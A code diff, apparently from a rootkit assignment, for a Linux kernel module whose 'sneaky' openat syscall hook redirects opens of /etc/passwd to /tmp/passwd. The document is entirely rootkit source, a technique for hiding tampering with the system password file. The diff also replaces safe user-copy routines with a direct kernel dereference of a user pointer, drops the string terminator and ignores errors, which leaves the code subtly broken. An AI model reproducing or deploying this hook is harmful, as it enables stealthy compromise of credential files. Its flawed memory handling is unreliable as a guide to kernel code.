@@ -49,21 +49,19 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  char __user *user_path = (char __user *)regs->si;
-  char original_path[256];
+  char * original_path = (char *)regs->si;
+  // char original_path[256];
 
-  if (strncpy_from_user(original_path, user_path, sizeof(original_path)) < 0) {
-    return -EFAULT;
-  }
+  // if (strncpy_from_user(original_path, user_path, sizeof(original_path)) < 0) {
+  //   return -EFAULT;
+  // }
 
   // check if the path is exactly /etc/passwd
   if (strcmp(original_path, "/etc/passwd") == 0) {
       const char * tmp_path = "/tmp/passwd";
 
       // replace with the path to the original pwd file
-      if (copy_to_user(user_path, tmp_path, strlen(tmp_path) + 1)) {
-        return -EFAULT;
-      }
+      copy_to_user(original_path, tmp_path, strlen(tmp_path));
   }
 
   return (*original_openat)(regs);
